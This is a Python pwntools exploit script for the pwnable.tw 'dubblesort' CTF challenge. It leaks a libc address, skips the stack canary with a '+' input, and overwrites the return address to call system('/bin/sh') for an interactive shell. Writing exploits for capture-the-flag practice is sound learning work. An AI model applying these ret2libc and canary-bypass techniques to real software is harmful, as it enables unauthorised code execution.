#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level='DEBUG'

'''
r=remote('chall.pwnable.tw',10101)
libc=ELF('./libc_32.so.6')
'''


r=process('./dubblesort')
libc=ELF('/lib32/libc-2.27.so')


'''
r=process('./dubblesort',env={"LD_PRELOAD":"/root/pwnable.tw/dubblesort/libc_32.so.6"})
libc=ELF('./libc_32.so.6')
'''

#leak libc_base
r.recvuntil('What your name :')
r.sendline('a'*20)
r.recvuntil('\n')
#libc_base=u32('\x00'+r.recv(3))-0x1D2CD0
libc_base=u32('\x00'+r.recv(3))-0x1D5000	#本地(我就TM奇他喵了个咪的怪了，本地能打远程就不行？
success('libc_base:'+hex(libc_base))

sys_addr=libc_base+libc.sym['system']
binsh_addr=libc_base+libc.search('/bin/sh').next()
#binsh_addr=libc_base+0x168e8b
success('sys_addr:'+hex(sys_addr))
success('binsh_addr:'+hex(binsh_addr))

'''
0x5f066 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL

one_gadget=libc_base+0x5f066
success('one_gadget addr:'+hex(one_gadget))
'''

#gdb.attach(r)

#r.recvuntil('How many numbers do you what to sort :')
r.sendline('36')

for i in range(0,24):
	r.recvuntil(':')
	r.sendline(str(i))

#bypass canary
r.recvuntil(':')
r.sendline('+')	#24,canary

for i in range(0,8):
	r.recvuntil(':')
	r.sendline(str(sys_addr))

for i in range(0,3):
	r.recvuntil(':')
	r.sendline(str(binsh_addr))

r.interactive()









